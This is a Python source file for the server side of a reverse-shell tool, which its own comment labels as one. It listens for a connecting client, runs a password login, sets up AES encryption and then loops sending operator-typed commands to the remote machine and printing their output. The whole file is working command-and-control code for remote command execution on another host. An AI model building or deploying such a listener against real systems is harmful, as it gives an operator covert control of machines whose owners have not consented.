import socket
import sys
import hashlib
from pyfiglet import Figlet
from getpass import getpass

from lib.endpoint import EndPoint


class Server(EndPoint):
    def __init__(self):
        super().__init__()
        self.user = dict(
            user_id="",
            user_name="",
            user_password=""
        )

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.startServer()

    def startServer(self):
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
        self.server_socket.bind((self.HOST, self.PORT))
        self.server_socket.listen(5)

        # reverse_shell starting application
        app_name, app_version = self.app_conf['APP_NAME'], self.app_conf['VERSION']
        print(f"[*] Starting {app_name} -version:{app_version} -address: {self.HOST}:{self.PORT}")
        f = Figlet(font='larry3d')
        print(f"{self.colors_PRIMARY}")
        print(f.renderText("s e r v e r"))
        print(f"{self.colors_RESET}")

    def acceptConnection(self):
        print(f"[*] Waiting For Incoming Connections")

        client_socket, address = self.server_socket.accept()
        print(f"[+] Connection established with ip - {address[0]}:{address[1]}\n")

        # Set a timeout for the connection
        client_socket.settimeout(10)
        return client_socket, address

    def authClientConnection(self, clientSocket):
        while True:
            login_msg: dict = self.receiveMsg(clientSocket)

            if 'login_success' in login_msg.keys():
                print(f"[+] {login_msg['login_success']}")
                key = self.user['user_password'].encode('UTF-8')
                iv = login_msg['AES_IV']
                self.AES_KEY, self.AES_IV = self.initAESEncryption(key, iv)
                break

            else:
                print(f"[-] {login_msg['login_error']}")
                user_name = input("Enter your username >> ")
                password = getpass(prompt="Enter your password >> ")

                user = dict({
                    'user_id': "",
                    'user_name': user_name,
                    'user_password': hashlib.sha3_256(password.encode('utf-8')).hexdigest()[:12]
                })
                self.user = user
                self.sendMsg(clientSocket, user)

    def getMsgInputToBeSent(self, client_socket, address):
        client_ip_address, client_port = address[0], address[1]
        client_full_address = f"{client_ip_address}:{client_port}"
        client_user_name = self.user['user_name'].replace(' ', '_').lower() or 'client'

        while True:
            str_msg = input(f"{client_user_name}@{client_full_address} >> ")

            if str_msg:
                break

        msg: dict = dict({
            'command': str_msg
        })

        if str_msg.lower() == "exit":
            self.sendMsg(client_socket, msg)
            self.closeConnection(socket=client_socket, HOST=address[0], PORT=address[1])
            self.server_socket.close()
            sys.exit()

        return msg

    def displayReceivedMsg(self, data: dict):
        return_code, stdout, stderr = data['return_code'], data['stdout'].decode(), data['stderr'].decode()

        if return_code == 0:
            print(f"{self.colors_SUCCESS} {stdout} {self.colors_RESET}")
        else:
            print(f"{self.colors_FAIL} {stderr} {self.colors_RESET}")


def Main():
    try:
        server = Server()
        client_socket, address = server.acceptConnection()
        server.authClientConnection(client_socket)

        while True:
            msg: dict = server.getMsgInputToBeSent(client_socket, address)
            server.sendMsg(client_socket, msg)

            received_msg: dict = server.receiveMsg(client_socket)
            server.displayReceivedMsg(received_msg)

    except socket.error or Exception as error:
        print(f"[-] Error : {error}")
        sys.exit()


if __name__ == "__main__":
    Main()
